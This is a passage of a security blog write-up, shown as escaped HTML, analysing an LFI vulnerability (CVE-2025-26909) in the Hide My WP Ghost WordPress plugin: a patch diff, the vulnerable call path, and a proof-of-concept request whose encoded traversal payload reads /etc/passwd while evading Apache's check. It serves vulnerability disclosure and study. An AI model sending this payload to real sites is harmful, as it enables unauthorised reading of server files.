Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Hide My WP Ghost&lt;/strong&gt;: &lt;strong&gt;5.3.02&lt;/strong&gt; (vulnerable) and &lt;strong&gt;5.4.02&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff/comparison tool to check and compare differences between the two versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Vulnerable version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function getOriginalUrl( $url ) {&#xA;&#xA;    // Build the rewrite rules if they are not already built&#xA;    if ( empty( $this-&amp;gt;_rewrites ) ) {&#xA;        $this-&amp;gt;buildRedirect();&#xA;    }&#xA;&#xA;    // Parse the URL components&#xA;    $parse_url = wp_parse_url( $url );&#xA;&#xA;    // Get the home root path&#xA;    $path = wp_parse_url( home_url(), PHP_URL_PATH );&#xA;&#xA;    // Backslash the paths&#xA;    if ( $path &amp;lt;&amp;gt; &amp;#39;&amp;#39; ) {&#xA;        $parse_url[&amp;#39;path&amp;#39;] = preg_replace( &amp;#39;/^&amp;#39; . preg_quote( $path, &amp;#39;/&amp;#39; ) . &amp;#39;/&amp;#39;, &amp;#39;&amp;#39;, $parse_url[&amp;#39;path&amp;#39;] );&#xA;    }&#xA;&#xA;    // Replace paths to original based on rewrite rules&#xA;    if ( isset( $this-&amp;gt;_rewrites[&amp;#39;from&amp;#39;] ) &amp;amp;&amp;amp; isset( $this-&amp;gt;_rewrites[&amp;#39;to&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $this-&amp;gt;_rewrites[&amp;#39;from&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $this-&amp;gt;_rewrites[&amp;#39;to&amp;#39;] ) ) {&#xA;        $parse_url[&amp;#39;path&amp;#39;] = preg_replace( $this-&amp;gt;_rewrites[&amp;#39;from&amp;#39;], $this-&amp;gt;_rewrites[&amp;#39;to&amp;#39;], $parse_url[&amp;#39;path&amp;#39;], 1 );&#xA;    }&#xA;&#xA;    // Default to https if the scheme is not set&#xA;    if ( ! isset( $parse_url[&amp;#39;scheme&amp;#39;] ) ) {&#xA;        $parse_url[&amp;#39;scheme&amp;#39;] = &amp;#39;https&amp;#39;;&#xA;    }&#xA;&#xA;    // Reconstruct the URL&#xA;    if ( isset( $parse_url[&amp;#39;port&amp;#39;] ) &amp;amp;&amp;amp; $parse_url[&amp;#39;port&amp;#39;] &amp;lt;&amp;gt; 80 ) {&#xA;        $new_url = $parse_url[&amp;#39;scheme&amp;#39;] . &amp;#39;://&amp;#39; . $parse_url[&amp;#39;host&amp;#39;] . &amp;#39;:&amp;#39; . $parse_url[&amp;#39;port&amp;#39;] . $path . $parse_url[&amp;#39;path&amp;#39;];&#xA;    } else {&#xA;        $new_url = $parse_url[&amp;#39;scheme&amp;#39;] . &amp;#39;://&amp;#39; . $parse_url[&amp;#39;host&amp;#39;] . $path . $parse_url[&amp;#39;path&amp;#39;];&#xA;    }&#xA;&#xA;    // Append query string if present&#xA;    if ( isset( $parse_url[&amp;#39;query&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $parse_url[&amp;#39;query&amp;#39;] ) ) {&#xA;        $query   = $parse_url[&amp;#39;query&amp;#39;];&#xA;        $query   = str_replace( array( &amp;#39;?&amp;#39;, &amp;#39;%3F&amp;#39; ), &amp;#39;&amp;amp;&amp;#39;, $query );&#xA;        $new_url .= ( ! strpos( $new_url, &amp;#39;?&amp;#39; ) ? &amp;#39;?&amp;#39; : &amp;#39;&amp;amp;&amp;#39; ) . $query;&#xA;    }&#xA;&#xA;    // Return the constructed URL&#xA;    return $new_url;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;getOriginalUrl()&lt;/code&gt; function is used to parse and reconstruct the original URL based on the system&amp;rsquo;s rewrite rules.&lt;/p&gt;&#xA;&lt;p&gt;In the vulnerable version, the value of &lt;code&gt;$new_url&lt;/code&gt; is not sanitized before being returned, allowing an attacker to inject malicious path components like &lt;code&gt;../../etc/passwd&lt;/code&gt;, leading to &lt;strong&gt;LFI&lt;/strong&gt; risk.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function getOriginalUrl( $url ) {&#xA;&#xA;    // Build the rewrite rules if they are not already built&#xA;    if ( empty( $this-&amp;gt;_rewrites ) ) {&#xA;        $this-&amp;gt;buildRedirect();&#xA;    }&#xA;&#xA;    // Parse the URL components&#xA;    $parse_url = wp_parse_url( $url );&#xA;&#xA;    // Only if there is a path to change&#xA;    if( !isset( $parse_url[&amp;#39;path&amp;#39;] ) ) {&#xA;        return $url;&#xA;    }&#xA;&#xA;    // Get the home root path&#xA;    $path = wp_parse_url( home_url(), PHP_URL_PATH );&#xA;&#xA;    // Backslash the paths&#xA;    if ( $path &amp;lt;&amp;gt; &amp;#39;&amp;#39; ) {&#xA;        $parse_url[&amp;#39;path&amp;#39;] = preg_replace( &amp;#39;/^&amp;#39; . preg_quote( $path, &amp;#39;/&amp;#39; ) . &amp;#39;/&amp;#39;, &amp;#39;&amp;#39;, $parse_url[&amp;#39;path&amp;#39;] );&#xA;    }&#xA;&#xA;    // Replace paths to original based on rewrite rules&#xA;    if ( isset( $this-&amp;gt;_rewrites[&amp;#39;from&amp;#39;] ) &amp;amp;&amp;amp; isset( $this-&amp;gt;_rewrites[&amp;#39;to&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $this-&amp;gt;_rewrites[&amp;#39;from&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $this-&amp;gt;_rewrites[&amp;#39;to&amp;#39;] ) ) {&#xA;        $parse_url[&amp;#39;path&amp;#39;] = preg_replace( $this-&amp;gt;_rewrites[&amp;#39;from&amp;#39;], $this-&amp;gt;_rewrites[&amp;#39;to&amp;#39;], $parse_url[&amp;#39;path&amp;#39;], 1 );&#xA;    }&#xA;&#xA;    // Default to https if the scheme is not set&#xA;    if ( ! isset( $parse_url[&amp;#39;scheme&amp;#39;] ) ) {&#xA;        $parse_url[&amp;#39;scheme&amp;#39;] = &amp;#39;https&amp;#39;;&#xA;    }&#xA;&#xA;    // Reconstruct the URL&#xA;    if ( isset( $parse_url[&amp;#39;port&amp;#39;] ) &amp;amp;&amp;amp; $parse_url[&amp;#39;port&amp;#39;] &amp;lt;&amp;gt; 80 ) {&#xA;        $new_url = $parse_url[&amp;#39;scheme&amp;#39;] . &amp;#39;://&amp;#39; . $parse_url[&amp;#39;host&amp;#39;] . &amp;#39;:&amp;#39; . $parse_url[&amp;#39;port&amp;#39;] . $path . $parse_url[&amp;#39;path&amp;#39;];&#xA;    } else {&#xA;        $new_url = $parse_url[&amp;#39;scheme&amp;#39;] . &amp;#39;://&amp;#39; . $parse_url[&amp;#39;host&amp;#39;] . $path . $parse_url[&amp;#39;path&amp;#39;];&#xA;    }&#xA;&#xA;    // Append query string if present&#xA;    if ( isset( $parse_url[&amp;#39;query&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $parse_url[&amp;#39;query&amp;#39;] ) ) {&#xA;        $query   = $parse_url[&amp;#39;query&amp;#39;];&#xA;        $query   = str_replace( array( &amp;#39;?&amp;#39;, &amp;#39;%3F&amp;#39; ), &amp;#39;&amp;amp;&amp;#39;, $query );&#xA;        $new_url .= ( ! strpos( $new_url, &amp;#39;?&amp;#39; ) ? &amp;#39;?&amp;#39; : &amp;#39;&amp;amp;&amp;#39; ) . $query;&#xA;    }&#xA;&#xA;    // Return the constructed URL&#xA;    return sanitize_url( $new_url );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch calls &lt;code&gt;sanitize_url($new_url)&lt;/code&gt; before returning, which helps remove dangerous path components or schemes, preventing &lt;strong&gt;LFI&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;getOriginalUrl()&lt;/code&gt; is called in &lt;code&gt;showFile()&lt;/code&gt;, and its return value is assigned to &lt;code&gt;$new_url&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function showFile( $url ) {&#xA;    // other logic&#xA;    $new_url          = $this-&amp;gt;getOriginalUrl( $url );&#xA;    $new_url_no_query = ( ( strpos( $new_url, &amp;#39;?&amp;#39; ) !== false ) ? substr( $new_url, 0, strpos( $new_url, &amp;#39;?&amp;#39; ) ) : $new_url );&#xA;    $new_path         = $this-&amp;gt;getOriginalPath( $new_url );&#xA;    $ctype            = false;&#xA;&#xA;    if ( $ext = $this-&amp;gt;isFile( $new_url ) ) {&#xA;        // other logic&#xA;    } elseif ( strpos( trailingslashit( $new_url_no_query ), &amp;#39;/&amp;#39; . HMWP_Classes_Tools::getOption( &amp;#39;hmwp_login_url&amp;#39; ) . &amp;#39;/&amp;#39; ) || strpos( trailingslashit( $new_url_no_query ), &amp;#39;/&amp;#39; . HMWP_Classes_Tools::getDefault( &amp;#39;hmwp_login_url&amp;#39; ) . &amp;#39;/&amp;#39; ) ) {&#xA;        // other logic&#xA;    } elseif ( $url &amp;lt;&amp;gt; $new_url ) {&#xA;        if ( stripos( trailingslashit( $new_url_no_query ), &amp;#39;/&amp;#39; . HMWP_Classes_Tools::getDefault( &amp;#39;hmwp_wp-json&amp;#39; ) . &amp;#39;/&amp;#39; ) !== false ) {&#xA;            // other logic&#xA;        } elseif ( strpos( trailingslashit( $new_url_no_query ), &amp;#39;/&amp;#39; . HMWP_Classes_Tools::getDefault( &amp;#39;hmwp_activate_url&amp;#39; ) . &amp;#39;/&amp;#39; ) !== false || strpos( trailingslashit( $new_url_no_query ), &amp;#39;/&amp;#39; . HMWP_Classes_Tools::getDefault( &amp;#39;hmwp_wp-signup_url&amp;#39; ) . &amp;#39;/&amp;#39; ) !== false ) {&#xA;            ob_start();&#xA;            include $new_path;&#xA;            $content = ob_get_clean();&#xA;            header( &amp;#34;HTTP/1.1 200 OK&amp;#34; );&#xA;            //Echo the html file content&#xA;            echo $content;&#xA;            exit();&#xA;        } elseif ( ! HMWP_Classes_Tools::getValue( &amp;#39;nordt&amp;#39; ) ) {&#xA;            // other logic&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;include $new_path&lt;/code&gt; is the point that can cause LFI; for it to be reached, the surrounding conditions must be satisfied.&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;$url&lt;/code&gt; is different from &lt;code&gt;$new_url&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;In &lt;code&gt;getOriginalUrl()&lt;/code&gt; the query handling is:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( isset( $parse_url[&amp;#39;query&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $parse_url[&amp;#39;query&amp;#39;] ) ) {&#xA;    $query   = $parse_url[&amp;#39;query&amp;#39;];&#xA;    $query   = str_replace( array( &amp;#39;?&amp;#39;, &amp;#39;%3F&amp;#39; ), &amp;#39;&amp;amp;&amp;#39;, $query );&#xA;    $new_url .= ( ! strpos( $new_url, &amp;#39;?&amp;#39; ) ? &amp;#39;?&amp;#39; : &amp;#39;&amp;amp;&amp;#39; ) . $query;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_parse_url( &#39;http://localhost/x/abc?&#39; )&lt;/code&gt; -&amp;gt; has a &lt;code&gt;path&lt;/code&gt; but &lt;code&gt;query&lt;/code&gt; is empty (or &lt;code&gt;query&lt;/code&gt; is unset / empty).&lt;/li&gt;&#xA;&lt;li&gt;The condition &lt;code&gt;isset(...) &amp;amp;&amp;amp; ! empty(...)&lt;/code&gt; will &lt;strong&gt;fail&lt;/strong&gt; for a bare &lt;code&gt;?&lt;/code&gt; without parameters, so nothing is appended to &lt;code&gt;$new_url&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$new_url&lt;/code&gt; returns &lt;code&gt;http://localhost/x/abc&lt;/code&gt; (no &lt;code&gt;?&lt;/code&gt;), while the original &lt;code&gt;$url&lt;/code&gt; is &lt;code&gt;http://localhost/x/abc?&lt;/code&gt;, so they differ and (&lt;code&gt;$url &amp;lt;&amp;gt; $new_url&lt;/code&gt;) is &lt;code&gt;true&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;$new_url_no_query&lt;/code&gt; must contain the string &lt;code&gt;&#39;/&#39; . HMWP_Classes_Tools::getDefault(&#39;hmwp_activate_url&#39;) . &#39;/&#39;&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Searching the plugin source for &lt;code&gt;hmwp_activate_url&lt;/code&gt;, we find the function &lt;code&gt;HMWP_Classes_Tools::getDefault(&#39;hmwp_activate_url&#39;)&lt;/code&gt; returns &lt;strong&gt;&lt;code&gt;wp-activate.php&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-18-cve-2025-26909/search1.png&#34;&#xA;    alt=&#34;Return value of HMWP_Classes_Tools::getDefault( &amp;#39;hmwp_activate_url&amp;#39; )&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Return value of &lt;code&gt;HMWP_Classes_Tools::getDefault( &#39;hmwp_activate_url&#39; )&lt;/code&gt;&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Therefore, the practical condition is that &lt;code&gt;$new_url_no_query&lt;/code&gt; must contain &lt;strong&gt;&lt;code&gt;/wp-activate.php/&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;👉 Thus, for &lt;code&gt;include $new_path&lt;/code&gt; to be executed, the URL must have &lt;strong&gt;a trailing &lt;code&gt;?&lt;/code&gt;&lt;/strong&gt; (so &lt;code&gt;$url &amp;lt;&amp;gt; $new_url&lt;/code&gt;) and &lt;strong&gt;contain &lt;code&gt;/wp-activate.php/&lt;/code&gt;&lt;/strong&gt; in the path.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$new_path&lt;/code&gt; is the return value of &lt;code&gt;getOriginalPath($new_url)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function getOriginalPath( $new_url ) {&#xA;    // Remove domain from path&#xA;    $new_path = str_replace( home_url(), &amp;#39;&amp;#39;, $new_url );&#xA;&#xA;    // Remove queries from path&#xA;    if ( strpos( $new_path, &amp;#39;?&amp;#39; ) !== false ) {&#xA;        $new_path = substr( $new_path, 0, strpos( $new_path, &amp;#39;?&amp;#39; ) );&#xA;    }&#xA;&#xA;    return HMWP_Classes_Tools::getRootPath() . ltrim( $new_path, &amp;#39;/&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function returns the root path without the query string, for example:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#34;http://localhost/x/wp-activate.php?&amp;#34; -&amp;gt; &amp;#34;/srv/www/wordpress/x/wp-activate.php&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So we have the necessary conditions for LFI to occur; we need to find the call flow to &lt;code&gt;showFile()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function maybeShowNotFound() {&#xA;    //If the file doesn&amp;#39;t exist&#xA;    //show the file content&#xA;    if ( is_404() ) {&#xA;        $this-&amp;gt;showFile( $this-&amp;gt;getCurrentURL() );&#xA;    } else {&#xA;        $this-&amp;gt;maybeShowLogin( $this-&amp;gt;getCurrentURL() );&#xA;    }&#xA;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;showFile()&lt;/code&gt; is called by &lt;code&gt;maybeShowNotFound&lt;/code&gt; when the client requests a non-existent resource, with the parameter being the result of &lt;code&gt;getCurrentURL()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function getCurrentURL() {&#xA;    $url = &amp;#39;&amp;#39;;&#xA;&#xA;    if ( isset( $_SERVER[&amp;#39;HTTP_HOST&amp;#39;] ) ) {&#xA;        // build the URL in the address bar&#xA;        $url = is_ssl() ? &amp;#39;https://&amp;#39; : &amp;#39;http://&amp;#39;;&#xA;        $url .= $_SERVER[&amp;#39;HTTP_HOST&amp;#39;];&#xA;        $url .= rawurldecode( $_SERVER[&amp;#39;REQUEST_URI&amp;#39;] );&#xA;    }&#xA;&#xA;    return $url;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;URI&lt;/code&gt; from &lt;code&gt;$_SERVER[&#39;REQUEST_URI&#39;]&lt;/code&gt; is decoded and concatenated into &lt;code&gt;$url&lt;/code&gt; to return.&lt;/p&gt;&#xA;&lt;p&gt;We placed a debugger in &lt;code&gt;showFile()&lt;/code&gt; and sent a request to a non-existent resource.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /x/wp-activate.php? HTTP/1.1&#xA;Host: localhost&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The debugger hit &lt;code&gt;showFile()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-18-cve-2025-26909/debug1.png&#34;&#xA;    alt=&#34;Debugger hit showFile()&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debugger hit &lt;code&gt;showFile()&lt;/code&gt;&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Send a request with the LFI payload&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/etc/passwd? HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Connection: keep-alive&#xA;Upgrade-Insecure-Requests: 1&#xA;Sec-Fetch-Dest: document&#xA;Sec-Fetch-Mode: navigate&#xA;Sec-Fetch-Site: none&#xA;Sec-Fetch-User: ?1&#xA;X-PwnFox-Color: blue&#xA;Priority: u=0, i&#xA;Content-Length: 0&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Debug&lt;/strong&gt;:&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-18-cve-2025-26909/debug2.png&#34;&#xA;    alt=&#34;Debugger with valid payload&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debugger with valid payload&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-18-cve-2025-26909/result1.png&#34;&#xA;    alt=&#34;Successful LFI result&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Successful LFI result&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;strong&gt;Explanation&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;/x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/etc/passwd?&lt;/code&gt; after decoding becomes &lt;code&gt;/x/wp-activate.php/..///..///..///..///../etc/passwd?&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;We use this string to trick Apache so that Apache does not detect Document Root traversal. If we use &lt;code&gt;/x/wp-activate.php/../../../../../etc/passwd?&lt;/code&gt; Apache will detect the Document Root traversal.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;///&lt;/code&gt; is still accepted as equivalent to &lt;code&gt;/&lt;/code&gt;, for example:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;w41bu1@22NS088:~$ ls /////////&#xA;bin  boot  cdrom  dev  etc  